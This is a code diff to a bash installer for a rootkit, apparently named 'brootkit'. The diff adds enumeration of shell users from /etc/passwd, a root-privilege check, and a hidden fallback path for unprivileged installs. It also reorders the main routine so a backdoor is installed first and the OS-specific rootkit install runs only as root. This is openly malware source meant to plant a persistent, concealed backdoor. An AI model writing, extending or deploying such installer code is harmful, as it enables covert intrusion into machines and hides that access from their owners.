@@ -3,6 +3,10 @@
 BR_ROOTKIT_PATH="/usr/include/..."
 
 declare br_os_type=0
+declare br_privilege=1
+declare -a br_shell=()
+declare br_shell_idx=0
+declare -a br_user=()
 
 function br_install_rootkit()
 {
@@ -13,6 +17,44 @@ function br_install_rootkit()
 function br_hookhup()
 {
         :
+}
+
+function br_check_shell()
+{
+	local idx line user shell
+
+	while read line
+	do
+		user=`echo $line | cut -d ":" -f 1`
+		shell=`echo $line | cut -d ":" -f 7`
+
+		if [ "$shell" == "/bin/bash" -o "$shell" == "/bin/sh" ]; then
+			br_user[br_shell_idx]=$user
+			br_shell[br_shell_idx]=$shell
+			((br_shell_idx++))
+		fi
+	done < /etc/passwd
+
+	[ ${#br_user} -eq 0 ] && echo "no users has bash/sh environment." && exit
+
+	for ((idx = 0; idx < $br_shell_idx; idx++))
+	do
+		echo "detect user - ${br_user[$idx]} has ${br_shell[$idx]} evnironment."
+	done
+}
+
+function br_check_privilege()
+{
+	[ $UID -eq 0 -o $EUID -eq 0 ] && br_privilege=0 || br_privilege=1
+}
+
+function br_set_rootkit_path()
+{
+	if [ $br_privilege -eq 1 ]; then
+		BR_ROOTKIT_PATH="/home/$USER/..."
+	else
+		echo "install brootkit using root privilege."
+	fi
 }
 
 function br_check_os_type()
@@ -31,12 +73,12 @@ function br_check_os_type()
 	elif echo $line|grep "[Ff]edora" >/dev/null; then
 		br_os_type=5
 	else
-		echo -e "target os type: $line is not supported."
+		echo -e "target os type - $line is not supported."
 		exit 0
 	fi
 
-	echo -e "target os type: $line"
-	echo $br_os_type
+	echo -e "target os type - $line"
+	#echo $br_os_type
 }
 
 function br_centos_install()
@@ -108,21 +150,25 @@ function br_install_backdoor()
 function main()
 {
 	br_check_os_type
-
-	case $br_os_type in
-		1|2)
-			br_centos_install ;;
-		3)
-			br_ubuntu_install ;;
-		4)
-			br_debian_install ;;
-		5)
-			br_fedora_install ;;
-	esac
-
+	br_check_shell
+	br_check_privilege
+	br_set_rootkit_path
 	br_creat_home
 	br_install_backdoor
-	br_install_rootkit
+
+	if [ $br_privilege -eq 0 ]; then
+		case $br_os_type in
+			1|2)
+				br_centos_install ;;
+			3)
+				br_ubuntu_install ;;
+			4)
+				br_debian_install ;;
+			5)
+				br_fedora_install ;;
+		esac
+		br_install_rootkit
+	fi
 
 	if [ $? -eq 1 ]; then
 		echo "install brootkit failed."
